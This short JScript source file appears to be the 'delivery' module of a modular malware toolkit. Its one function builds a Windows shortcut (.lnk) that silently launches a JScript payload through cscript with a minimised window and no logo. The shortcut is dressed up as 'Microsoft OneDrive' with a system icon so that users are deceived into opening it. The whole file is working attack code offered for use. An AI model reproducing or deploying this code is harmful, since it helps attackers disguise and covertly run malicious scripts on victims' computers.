// chunk: delivery/lnk_wrapper
// depends: core/run_cmd
// provides: create_lnk_cscript
// format: jscript
// note: generates a .lnk shortcut that executes a JScript payload via cscript (no window)

function create_lnk_cscript(jsPayloadPath, lnkOutputPath, iconPath) {
    var link = _s.CreateShortcut(lnkOutputPath);
    link.TargetPath = "C:\\Windows\\System32\\cscript.exe";
    link.Arguments = "//nologo //E:jscript \"" + jsPayloadPath + "\"";
    link.WindowStyle = 7;
    link.Description = "Microsoft OneDrive";
    if (iconPath) {
        link.IconLocation = iconPath;
    } else {
        link.IconLocation = "C:\\Windows\\System32\\shell32.dll,3";
    }
    link.WorkingDirectory = "C:\\Windows\\System32";
    link.Save();
    return lnkOutputPath;
}
